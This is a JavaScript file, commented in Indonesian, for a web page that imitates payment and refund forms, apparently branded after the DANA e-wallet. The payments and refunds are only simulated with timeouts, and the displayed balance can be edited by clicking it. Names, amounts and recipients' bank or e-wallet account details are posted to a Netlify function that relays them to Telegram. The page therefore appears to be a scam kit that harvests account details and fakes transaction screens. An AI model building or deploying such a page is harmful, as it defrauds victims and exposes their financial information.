// Tab Navigation
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        // Hapus kelas active dari semua tab
        document.querySelectorAll('.tab').forEach(t => {
            t.classList.remove('active');
        });
        
        // Tambahkan kelas active ke tab yang diklik
        this.classList.add('active');
        
        // Sembunyikan semua konten
        document.querySelectorAll('.content').forEach(content => {
            content.classList.remove('active');
        });
        
        // Tampilkan konten yang sesuai
        const tabId = this.getAttribute('data-tab');
        document.getElementById(tabId).classList.add('active');
        
        // Sembunyikan pesan error saat berpindah tab
        document.getElementById('payment-error').style.display = 'none';
        document.getElementById('refund-error').style.display = 'none';
        document.getElementById('success-message').style.display = 'none';
    });
});

// Tampilkan informasi pembayaran berdasarkan metode yang dipilih
document.getElementById('payment-method').addEventListener('change', function() {
    const method = this.value;
    document.getElementById('bank-info').style.display = 'none';
    document.getElementById('ewallet-info').style.display = 'none';
    document.getElementById('qris-info').style.display = 'none';
    
    if (method === 'bank') {
        document.getElementById('bank-info').style.display = 'block';
    } else if (method === 'ewallet') {
        document.getElementById('ewallet-info').style.display = 'block';
    } else if (method === 'qris') {
        document.getElementById('qris-info').style.display = 'block';
    }
});

// Tampilkan form detail pengembalian
document.getElementById('refund-method').addEventListener('change', function() {
    const method = this.value;
    if (method) {
        document.getElementById('refund-details').style.display = 'block';
    } else {
        document.getElementById('refund-details').style.display = 'none';
    }
});

// Format input jumlah uang
function formatCurrency(input) {
    // Hapus semua karakter non-digit
    let value = input.value.replace(/[^\d]/g, '');
    
    // Jika value kosong, set ke 0
    if (value === '') value = '0';
    
    // Format angka dengan pemisah ribuan
    input.value = Number(value).toLocaleString('id-ID');
}

// Event listener untuk format input pembayaran
document.getElementById('payment-amount').addEventListener('input', function() {
    formatCurrency(this);
});

// Event listener untuk format input pengembalian
document.getElementById('refund-amount').addEventListener('input', function() {
    formatCurrency(this);
});

// Fungsi untuk mendapatkan nilai numerik dari input yang diformat
function getNumericValue(formattedValue) {
    return parseInt(formattedValue.replace(/[^\d]/g, '') || '0');
}

// Saldo saat ini bisa diklik untuk edit
let isEditingBalance = false;
let currentBalance = 1250000;

document.getElementById('balance-display').addEventListener('click', function() {
    if (!isEditingBalance) {
        // Masuk mode edit
        isEditingBalance = true;
        this.classList.add('editable');
        document.getElementById('balance-amount').style.display = 'none';
        document.getElementById('balance-input').style.display = 'block';
        document.getElementById('balance-input').value = currentBalance.toLocaleString('id-ID');
        document.getElementById('balance-input').focus();
    }
});

// Event listener untuk input saldo
document.getElementById('balance-input').addEventListener('input', function() {
    formatCurrency(this);
});

// Event listener untuk ketika input saldo kehilangan fokus
document.getElementById('balance-input').addEventListener('blur', function() {
    if (isEditingBalance) {
        // Keluar dari mode edit
        isEditingBalance = false;
        document.getElementById('balance-display').classList.remove('editable');
        document.getElementById('balance-input').style.display = 'none';
        
        // Update saldo
        const newBalance = getNumericValue(this.value);
        if (newBalance > 0) {
            currentBalance = newBalance;
            document.getElementById('balance-amount').textContent = 'Rp ' + newBalance.toLocaleString('id-ID');
        }
        
        document.getElementById('balance-amount').style.display = 'inline';
    }
});

// Event listener untuk tombol Enter pada input saldo
document.getElementById('balance-input').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        this.blur();
    }
});

// Validasi form
function validatePaymentForm() {
    const name = document.getElementById('payer-name').value.trim();
    const amount = getNumericValue(document.getElementById('payment-amount').value);
    const method = document.getElementById('payment-method').value;
    
    if (!name) {
        return 'Harap masukkan nama pembeli';
    }
    
    if (amount <= 0) {
        return 'Harap masukkan jumlah pembayaran yang valid';
    }
    
    if (!method) {
        return 'Harap pilih metode pembayaran';
    }
    
    return null; // Tidak ada error
}

function validateRefundForm() {
    const amount = getNumericValue(document.getElementById('refund-amount').value);
    const name = document.getElementById('refund-name').value.trim();
    const method = document.getElementById('refund-method').value;
    
    if (amount <= 0) {
        return 'Harap masukkan jumlah pengembalian yang valid';
    }
    
    if (amount > currentBalance) {
        return 'Jumlah pengembalian melebihi saldo yang tersedia';
    }
    
    if (!name) {
        return 'Harap masukkan nama penerima';
    }
    
    if (!method) {
        return 'Harap pilih metode pengembalian';
    }
    
    // Validasi detail rekening jika metode dipilih
    if (method) {
        const bank = document.getElementById('recipient-bank').value.trim();
        const account = document.getElementById('recipient-account').value.trim();
        const accountName = document.getElementById('recipient-name').value.trim();
        
        if (!bank || !account || !accountName) {
            return 'Harap lengkapi informasi rekening/e-wallet penerima';
        }
    }
    
    return null; // Tidak ada error
}

// Fungsi untuk mengirim data ke Netlify Function
async function sendToTelegram(data) {
    try {
        const response = await fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Gagal mengirim data ke Telegram');
        }

        return await response.json();
    } catch (error) {
        console.error('Error:', error);
        throw error;
    }
}

// Proses Pembayaran
document.getElementById('process-payment').addEventListener('click', async function() {
    const error = validatePaymentForm();
    const errorElement = document.getElementById('payment-error');
    
    if (error) {
        errorElement.textContent = error;
        errorElement.style.display = 'block';
        return;
    }
    
    // Sembunyikan pesan error jika ada
    errorElement.style.display = 'none';
    
    // Tampilkan modal loading
    document.getElementById('loadingModal').style.display = 'flex';
    
    try {
        // Kumpulkan data pembayaran
        const paymentData = {
            type: 'payment',
            name: document.getElementById('payer-name').value.trim(),
            amount: getNumericValue(document.getElementById('payment-amount').value),
            method: document.getElementById('payment-method').value,
            timestamp: new Date().toISOString()
        };

        // Kirim data ke Telegram
        await sendToTelegram(paymentData);
        
        // Simulasi proses pembayaran (2 detik)
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Sembunyikan modal loading
        document.getElementById('loadingModal').style.display = 'none';
        
        // Tampilkan pesan sukses
        const successMessage = document.getElementById('success-message');
        const method = document.getElementById('payment-method').value;
        
        if (method === 'qris') {
            successMessage.textContent = 'Silakan scan QRIS untuk menyelesaikan pembayaran! Notifikasi telah dikirim ke Telegram.';
        } else {
            successMessage.textContent = 'Pembayaran berhasil diproses! Notifikasi telah dikirim ke Telegram.';
        }
        
        successMessage.style.display = 'block';
        
        // Reset form setelah 5 detik
        setTimeout(() => {
            successMessage.style.display = 'none';
            document.getElementById('payer-name').value = '';
            document.getElementById('payment-amount').value = '';
            document.getElementById('payment-method').value = '';
            document.getElementById('bank-info').style.display = 'none';
            document.getElementById('ewallet-info').style.display = 'none';
            document.getElementById('qris-info').style.display = 'none';
        }, 5000);
        
    } catch (error) {
        // Sembunyikan modal loading
        document.getElementById('loadingModal').style.display = 'none';
        
        // Tampilkan pesan error
        errorElement.textContent = 'Terjadi kesalahan saat memproses pembayaran. Silakan coba lagi.';
        errorElement.style.display = 'block';
    }
});

// Proses Pengembalian
document.getElementById('process-refund').addEventListener('click', async function() {
    const error = validateRefundForm();
    const errorElement = document.getElementById('refund-error');
    
    if (error) {
        errorElement.textContent = error;
        errorElement.style.display = 'block';
        return;
    }
    
    // Sembunyikan pesan error jika ada
    errorElement.style.display = 'none';
    
    // Tampilkan modal loading
    document.getElementById('loadingModal').style.display = 'flex';
    
    try {
        // Kumpulkan data pengembalian
        const refundData = {
            type: 'refund',
            amount: getNumericValue(document.getElementById('refund-amount').value),
            name: document.getElementById('refund-name').value.trim(),
            method: document.getElementById('refund-method').value,
            bank: document.getElementById('recipient-bank').value.trim(),
            account: document.getElementById('recipient-account').value.trim(),
            accountName: document.getElementById('recipient-name').value.trim(),
            currentBalance: currentBalance,
            timestamp: new Date().toISOString()
        };

        // Kirim data ke Telegram
        await sendToTelegram(refundData);
        
        // Simulasi proses pengembalian (2 detik)
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Update saldo
        const refundAmount = getNumericValue(document.getElementById('refund-amount').value);
        currentBalance -= refundAmount;
        document.getElementById('balance-amount').textContent = 'Rp ' + currentBalance.toLocaleString('id-ID');
        
        // Sembunyikan modal loading
        document.getElementById('loadingModal').style.display = 'none';
        
        // Tampilkan pesan sukses
        const successMessage = document.getElementById('success-message');
        successMessage.textContent = 'Pengembalian saldo berhasil diproses! Notifikasi telah dikirim ke Telegram.';
        successMessage.style.display = 'block';
        
        // Reset form setelah 5 detik
        setTimeout(() => {
            successMessage.style.display = 'none';
            document.getElementById('refund-amount').value = '';
            document.getElementById('refund-name').value = '';
            document.getElementById('refund-method').value = '';
            document.getElementById('recipient-bank').value = '';
            document.getElementById('recipient-account').value = '';
            document.getElementById('recipient-name').value = '';
            document.getElementById('refund-details').style.display = 'none';
        }, 5000);
        
    } catch (error) {
        // Sembunyikan modal loading
        document.getElementById('loadingModal').style.display = 'none';
        
        // Tampilkan pesan error
        errorElement.textContent = 'Terjadi kesalahan saat memproses pengembalian. Silakan coba lagi.';
        errorElement.style.display = 'block';
    }
});

// Inisialisasi saat halaman dimuat
document.addEventListener('DOMContentLoaded', function() {
    // Format saldo saat ini
    document.getElementById('balance-amount').textContent = 'Rp ' + currentBalance.toLocaleString('id-ID');
    
    // Tambahkan event listener untuk menutup modal loading jika diklik di luar
    document.getElementById('loadingModal').addEventListener('click', function(e) {
        if (e.target === this) {
            this.style.display = 'none';
        }
    });
});
